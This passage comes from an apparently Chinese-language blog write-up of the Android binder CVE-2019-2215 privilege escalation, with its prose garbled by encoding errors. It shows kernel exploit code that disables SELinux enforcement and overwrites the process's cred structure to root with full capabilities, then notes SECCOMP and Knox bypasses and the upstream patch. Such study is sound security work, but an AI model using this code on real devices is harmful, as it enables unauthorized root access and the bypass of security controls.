&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] selinux enforcing is enabled&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">selinuxEnforcing&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¿™é‡Œåªéœ€è¦å¯¹äºSELinuxåªéœ€æ ¹æ®kernelBase è®¡ç®—å‡ºå…·ä½“çš„åœ°å€ï¼Œå†ç›´æ¥è¿›è¡Œå†™å…¥0x0å³å¯ç¦ç”¨æ‰ã€‚&lt;/p>
&lt;p>ç°åœ¨çš„ç‰ˆæœ¬è¶Šæ¥è¶Šå¤šä¿æŠ¤å’Œæ£€æŸ¥æœºåˆ¶ï¼Œå®é™…ä¸Šç›´æ¥è¿™æ ·ä¸ä¸€å®šæ˜¯ä¸å¯è¡Œï¼Œæœ‰æ—¶å¾—æ¢å¤kallsymsè¡¨æ‰è¡Œ&lt;/p>
&lt;h3 id="root">Root&lt;/h3>
&lt;p>ææƒçš„å¸¸ç”¨è¯­å¥&lt;code>commit_creds(prepare_kernel_cred(NULL));&lt;/code>ï¼Œè¿™å°±æ˜¯å¸¸è§„çš„å¥—è·¯äº†ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">uid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">gid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">suid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sgid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">euid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">egid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fsuid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_UID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">fsgid&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">GLOBAL_ROOT_GID&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteDword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">securebits&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">SECUREBITS_DEFAULT&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_inheritable&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_EMPTY_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_permitted&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_effective&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_bset&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_FULL_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">kWriteQword&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kt">uint8_t&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">m_cred&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nf">offsetof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">cred&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">cap_ambient&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="n">CAP_EMPTY_SET&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å‰é¢å·²ç»æ³„éœ²å‡ºäº†task_struct-&amp;gt;credçš„åœ°å€ï¼Œè¿™é‡Œå°±åªç”¨å°†äº‹å…ˆå‡†å¤‡å¥½çš„credç»“æ„ä½“å†™å…¥å³å¯&lt;/p>
&lt;p>æœ€åæ‰§è¡Œ&lt;code>system(&amp;quot;/bin/sh&amp;quot;);&lt;/code>ã€&lt;code>execve(&amp;quot;/system/bin/sh&amp;quot;);&lt;/code>å³å¯è·å¾—rootæƒé™ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/image-20200629174038205.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;h3 id="disabling-seccomp">Disabling SECCOMP&lt;/h3>
&lt;p>é¢å¤–çš„å¦‚æœæƒ³è¦å°†ææƒç¨‹åºæ†ç»‘åˆ°appä¸Šçš„è¿˜éœ€è¦è¿™ä¸€æ­¥ï¼ŒAndroid8å¼€å§‹ï¼Œæ‰€æœ‰ Android è½¯ä»¶éƒ½ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ä¸ Linux å†…æ ¸è¿›è¡Œé€šä¿¡ï¼ŒSECCOMPè¿‡æ»¤å™¨ä¼šæ£€æµ‹æ‰€æœ‰çš„éæ³•è°ƒç”¨ã€‚SECCOMPè¿‡æ»¤å™¨æ˜¯æ”¾åœ¨zygote è¿›ç¨‹ä¸­ï¼Œè€Œæ‰€æœ‰çš„Androidåº”ç”¨ç¨‹åºéƒ½æ˜¯è¯¥è¿›ç¨‹forkå‡ºæ¥çš„ï¼ŒæŒ‰ç†æ‰€ä»¥ä¼šå½±å“åˆ°æ‰€æœ‰çš„åº”ç”¨ï¼Œä½†æ˜¯Androidå®‰å…¨å›¢é˜Ÿè¿›è¡Œäº†éƒ¨åˆ†ç­›é€‰ï¼Œåªä¼šé˜»æ­¢æŸäº›ç³»ç»Ÿè°ƒç”¨ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">seccomp&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">mode&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">seccomp_filter&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>æƒ³è¦ç¦ç”¨SECCOMPï¼Œç›´æ¥å°†modeæ”¹ä¸º0æ˜¯å¯¼è‡´å†…æ ¸å´©æºƒï¼Œéœ€è¦æ¸…é™¤TIF_SECCOMP æ ‡å¿—ã€‚&lt;a class="link" href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/" target="_blank" rel="noopener"
>è¿™ç¯‡æ–‡ç« &lt;/a>å®ç°äº†ç»•è¿‡ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹ä¸€çœ‹ã€‚&lt;/p>
&lt;p>å¯¹äºä¸‰æ˜Ÿçš„è®¾å¤‡ï¼Œè¿˜éœ€è¦ç»•è¿‡Knox/RKPæ‰è¡Œã€‚å¯¹äºå¦‚ä½•ç»•è¿‡ï¼Œæœ€è¿‘æœ‰äººå…¬å¼€äº†s8ç›¸å…³çš„&lt;a class="link" href="https://github.com/chompie1337/s8_2019_2215_poc" target="_blank" rel="noopener"
>åˆ©ç”¨ä»£ç &lt;/a>ï¼Œæ„Ÿå…´è¶£å¯ä»¥çœ‹çœ‹ã€‚&lt;/p>
&lt;h3 id="patch">patch&lt;/h3>
&lt;p>&lt;a class="link" href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b" target="_blank" rel="noopener"
>patch&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="n">diff&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="n">git&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">index&lt;/span> &lt;span class="n">a340766b51fe&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">.2&lt;/span>&lt;span class="n">ef8bd29e188&lt;/span> &lt;span class="mi">100644&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">---&lt;/span> &lt;span class="n">a&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+++&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">drivers&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">android&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">binder&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">@@&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">4302&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">6&lt;/span> &lt;span class="o">+&lt;/span>&lt;span class="mi">4302&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">18&lt;/span> &lt;span class="err">@@&lt;/span> &lt;span class="k">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">binder_thread_release&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_proc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">spin_lock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">lock&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="cm">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * If this thread used poll, make sure we remove the waitqueue
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * from any epoll data structures holding it with POLLFREE.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * waitqueue_active() is safe to use here because we&amp;#39;re holding
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ * the inner lock.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">+ */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">looper&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="n">BINDER_LOOPER_STATE_POLL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="nf">waitqueue_active&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="nf">wake_up_poll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">POLLHUP&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">POLLFREE&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">+&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">binder_inner_proc_unlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">thread&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">send_reply&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>åœ¨binder_thread freeä¹‹å‰æ¸…ç†æ‰thread-&amp;gt;waitå³å¯ã€‚&lt;/p>
&lt;h3 id="æ€»ç»“">æ€»ç»“&lt;/h3>
&lt;p>å»å¹´å‡ºçš„ç»å…¸çš„ææƒæ¼æ´ï¼Œè¿™ä¸ªæ¼æ´å½“åšææƒå…¥é—¨ä¹Ÿè¿˜ä¸é”™ï¼Œå¯ä»¥å­¦ä¹ åˆ°ä¸€ä¸ªå®Œæ•´çš„ææƒæµç¨‹å’Œå‡ ä¸ªå¸¸è§æ–¹æ³•ã€‚&lt;/p>
&lt;p>åç»­çœŸæœºæµ‹è¯•è¿‡ç¨‹ä¸­æ‰‹ä¸Šæ²¡pixel2 åªèƒ½åœ¨pixelçš„3.18ä¸Šæµ‹è¯•ï¼Œå¾—æ³¨æ„å…ˆæµ‹è¯•å†ä½¿ç”¨ç½‘ä¸Šçš„expã€‚ç„¶åå°±æ˜¯é€‚é…çš„è¯ä¸»è¦æ˜¯å¯¹äºä¸€äº›åç§»çš„é€‚é…ï¼Œä»¥åŠä¸æ˜¯æ‰€æœ‰çš„è®¾å¤‡èƒ½éƒ½ç›´æ¥åˆ©ç”¨ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å’Œä¸åŒäº§å•†åˆä¸ä¸€æ ·ã€‚&lt;/p>
&lt;p>ææƒè¿‡ç¨‹ä¸­æœ€ä¸»è¦æ³¨æ„çš„å°±æ˜¯ä¸è®©å†…æ ¸å‘ç”Ÿå¥‡å¥‡æ€ªæ€ªçš„å¥”æºƒï¼Œæ¯æ¬¡é‡åˆ°å¥”æºƒï¼Œå¯èƒ½å°±éœ€è¦æƒ³å…¶ä»–çš„æ–¹æ³•å»ç»•è¿‡ã€‚&lt;/p>
&lt;p>å…³äºè¿™ä¸ªæ¼æ´è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ€è·¯å¯ä»¥å°è¯•ï¼Œæ¯”å¦‚äººé€ é¡µè¡¨é•œåƒæ”»å‡»ä¹‹ç±»çš„æ–¹å¼ã€‚&lt;/p>
&lt;h3 id="å‚è€ƒ">å‚è€ƒ&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;a class="link" href="https://www.52pojie.cn/thread-1083552-1-1.html" target="_blank" rel="noopener"
>https://www.52pojie.cn/thread-1083552-1-1.html&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a class="link" href="https://blog.csdn.net/weixin_43901866/article/details/102458212" target="_blank" rel="noopener"
>https://blog.csdn.net/weixin_43901866/article/details/102458212&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
